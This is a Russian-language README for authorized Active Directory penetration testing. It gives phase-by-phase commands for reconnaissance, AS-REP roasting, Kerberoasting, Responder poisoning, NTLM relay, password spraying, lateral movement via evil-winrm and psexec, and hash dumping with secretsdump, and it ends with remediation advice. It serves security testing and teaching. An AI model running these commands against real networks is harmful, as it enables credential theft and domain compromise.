# README — Практическое тестирование безопасности Active Directory

> **Внимание.** Всякий тест безопасности должен проводиться только с письменного разрешения владельца сети. Нелегальные действия — уголовно наказуемы.

Этот README описывает пошаговый процесс тестирования Active Directory (AD) в условиях локальной сети, соответствующий схеме `pentesting_active_directory.svg`. Документ включает: подготовку окружения, установку инструментов, пофазовый план тестирования (разведка → перечисление → атаки на аутентификацию → эксплуатация → пост-эксплуатация → очистка и отчёт), а также готовые примеры команд и рекомендации по защите.

---

## Содержание

1. Цели и ограничения
2. Среда и требования
3. Установка инструментов (Kali Linux)
4. Подготовка тестовой лаборатории (рекомендации)
5. Фаза 1 — Разведка (Discovery)
6. Фаза 2 — Углублённое перечисление (Enumeration)
7. Фаза 3 — Атаки на аутентификацию (Credential attacks)
8. Фаза 4 — Эксплуатация и lateral movement
9. Фаза 5 — Пост-эксплуатация и эксфильтрация секретов
10. Фаза 6 — Анализ, отчёт и рекомендации
11. Чеклист команд и краткие шаблоны
12. Полезные примечания и рекомендации по безопасности

---

## 1. Цели и ограничения

* Цель: воспроизвести реальную цепочку атак против AD для поиска векторов эскалации привилегий и путей компрометации критичных ресурсов.
* Ограничения: рабочие действия нельзя выполнять без письменного согласия; в продуктивной сети согласовывай окна работ и методы, чтобы не нарушить работу сервисов.

## 2. Среда и требования

* Kali Linux (рекомендуется последняя версия) для атакующей станции.
* Доступ к тестовой сети (или авторизованная внутренняя сеть заказчика).
* Возможность подключиться к целевому сегменту (VPN, подключение в офисе, VM с маршрутизацией).

Минимальный набор инструментов (описано как устанавливать в разделе 3):

* nmap, smbclient, smbmap, enum4linux-ng, crackmapexec (CME), impacket scripts (GetNPUsers.py, GetUserSPNs.py, secretsdump.py, psexec.py, wmiexec.py), responder, kerbrute, bloodhound + neo4j, kerberoast tools, hashcat/john, evil-winrm, lsassy, mimikatz (Windows), rubeus (Windows).

## 3. Установка инструментов (Kali Linux) — кратко

В Kali рекомендуется устанавливать системные пакеты через `apt`, а Python-CLI — через `pipx` или виртуальные окружения (PEP 668).

Пример автоматизации установки (содержимое `setup_kali.sh` — прилагается):

```bash
# (сокращённый пример, полный в скрипте)
sudo apt update
sudo apt install -y nmap smbclient smbmap hashcat john bloodhound neo4j crackmapexec evil-winrm responder python3-impacket python3-pip pipx golang git
pipx ensurepath
pipx install enum4linux-ng
pipx install lsassy
# kerbrute через go
go install github.com/ropnop/kerbrute@latest
```

> Если pipx не доступен — создавай `python3 -m venv ~/tools/venv` и ставь пакеты внутри него.

## 4. Подготовка тестовой лаборатории

* Разверни отдельную AD-лабораторию (например, 1x Domain Controller (Windows Server), 1–2x Windows клиентских машин, и Linux атакующий). Используй изолированную сеть/host-only в VirtualBox/VMware.
* Настрой аудит и мониторинг — в тестовой среде включи логирование для проверки корректности воспроизведения артефактов.
* Всегда имитируй реальные политики паролей и роли для более правдоподобного теста.

## 5. Фаза 1 — Разведка (Discovery)

Цель: собрать карту сети, живые хосты, открытые порты и доступные службы.

### Инструменты:

* `nmap`, `crackmapexec`, `enum4linux-ng`, `ldapsearch`, `smbclient`, `smbmap`.

### Примеры команд:

```bash
# Быстрый полный TCP-скан по подсети
nmap -sS -p- --min-rate 1000 -T4 -oA nmap/all_tcp 10.0.0.0/24

# Проверка SMB/OS и шар
nmap -p 445 --script smb-os-discovery,smb-enum-shares,smb-protocols <ip>

# Быстрый обзор AD через CME
crackmapexec smb 10.0.0.0/24 --shares --users --groups

# enum4linux-ng для сбора информации (если установлен)
enum4linux-ng <target>
```

### Что искать:

* Domain Controllers (порт 389/636 LDAP, 88 Kerberos, 445 SMB, 3268/3269 GC).
* Сервисы, которые раскрывают версии и контакты (старые SMBv1, открытые шары с конфигами).

## 6. Фаза 2 — Углублённое перечисление (Enumeration)

Цель: собрать списки пользователей, группы, политики (GPO), данные о сервисах и учётках с делегированными правами.

### Инструменты:

* `GetNPUsers.py`, `GetUserSPNs.py`, `smbclient`, `smbmap`, `gpp-decrypt`, `SharpHound` (ingestor для BloodHound).

### Примеры команд:

```bash
# Поиск пользователей без preauth (AS-REP roast)
python3 GetNPUsers.py domain/ -dc-ip <dc_ip> -outputfile npusers.txt -format john

# Поиск SPN для Kerberoast
python3 GetUserSPNs.py -request -dc-ip <dc_ip> domain/ -outputfile spns.txt

# Собрать данные для BloodHound (SharpHound) — на Windows запускать SharpHound.exe
# Собранные .zip загружать в BloodHound GUI
```

### GPO и GPP:

* Ищи файлы, содержащие пароли (Group Policy Preferences) — использовать `gpp-decrypt` или поиск по XML.

## 7. Фаза 3 — Атаки на аутентификацию

Цель: получить креденшелы (или хэши), провести Kerberoast/AS-REP, NTLM relays, password spraying.

### Инструменты:

* `kerbrute`, `responder`, `ntlmrelayx.py`, `crackmapexec`, `hydra`, `hashcat`, `john`.

### Примеры команд:

```bash
# Kerbrute — userenum
kerbrute userenum --dc <dc_ip> -d domain.local users.txt

# AS-REP roasting — GetNPUsers (см. выше)
# Kerberoast — GetUserSPNs + подбор
# Запуск Responder (только в тестовой сети)
sudo responder -I eth0 -r -d -w

# NTLM relay (импакт):
python3 ntlmrelayx.py -tf targets.txt -smb2support -whitelist <ips>

# Password spraying с kerbrute
kerbrute passwordspray --dc <dc_ip> -d domain.local users.txt password123

# Подбор хэшей с hashcat (пример для Kerberos TGS)
hashcat -m 13100 hashfile.txt wordlist.txt
```

**Важно:** password spraying и Kerberos brute-force могут привести к блокировке учёток — используйте `--safe` режимы/ограничение частоты.

## 8. Фаза 4 — Эксплуатация и lateral movement

Цель: перемещаться по сети, запускать контрольно-выявляющие команды, использовать креды для доступа к другим хостам.

### Инструменты:

* `evil-winrm`, `psexec.py`, `wmiexec.py`, `smbexec.py`, `crackmapexec`.

### Примеры:

```bash
# Подключение через WinRM (evil-winrm)
evil-winrm -i <target_ip> -u 'user' -p 'Passw0rd'

# psexec (impacket) для выполнения команд
python3 psexec.py domain/user:pass@<target>

# wmiexec
python3 wmiexec.py domain/user:pass@<target>
```

### Lateral movement рекомендации:

* Используй украденные creds сначала на менее критичных машинах.
* Проверяй live-сервисы и используемые порты; ограничивай шум (меньше параллельных соединений).

## 9. Фаза 5 — Пост-эксплуатация и эксфильтрация секретов

Цель: получить привилегии (DA), собрать хэши, токены, сохранить доказательства и подготовить рекомендации.

### Инструменты:

* `secretsdump.py`, `mimikatz` (на целевой Windows), `lsassy`, `rubeus`.

### Примеры:

```bash
# secretsdump (импакет) — дамп хэшей с DC (если есть привилегии)
python3 secretsdump.py domain/administrator:Pass@dc

# Использование mimikatz — запускать на целевой Windows (PowerShell/PSExec)
# Rubeus — для Kerberos ticket ops (Windows)
```

### Что собирать:

* NTLM хэши пользователей и компов, дампы LSASS, Kerberos ticket'ы (TGT/TGS), конфигурации сервисов.

## 10. Фаза 6 — Анализ, отчёт и рекомендации

* Собери все артефакты: логи, скриншоты, экспорт BloodHound графа, список найденных уязвимых аккаунтов/политик.
* Подготовь отчёт, разделённый на: краткое резюме (для менеджмента), техническая часть (для админов), доказательства и PoC, рекомендации по исправлению.

### Рекомендации по исправлению (примерно):

* Включить MFA для администраторских аккаунтов.
* Отключить LLMNR/NetBIOS, внедрить защиту от NTLM relay (SMB signing), применить WHitelisting.
* Внедрить политики сложных паролей, мониторинг подозрительных логонов/успешных/ошибочных попыток, EDR.
* Убрать хранение паролей в GPP, обеспечить управление сервисными аккаунтами с минимальными правами.

## 11. Чеклист команд и шаблоны

(Краткий набор команд для быстрого старта — см. разделы выше для полной детализации.)

* Сканирование: `nmap -sS -p- --min-rate 1000 -T4 -oA nmap/all_tcp 10.0.0.0/24`
* SMB / AD overview: `crackmapexec smb 10.0.0.0/24 --shares --users --groups`
* AS-REP: `python3 GetNPUsers.py domain/ -dc-ip <dc> -format john`
* Kerberoast: `python3 GetUserSPNs.py -request -dc-ip <dc> domain/`
* Responder: `sudo responder -I eth0`
* WinRM: `evil-winrm -i <ip> -u user -p pass`
* secretsdump: `python3 secretsdump.py domain/user:pass@dc`

## 12. Полезные примечания и безопасность

* Всегда работай в контролируемой среде и документируй дату/время/команды.
* Не выполняй шумные операции в рабочей сети без разрешения (password spraying, responder, relay).
* Для демонстраций и PoC используй тестовую среду.

---

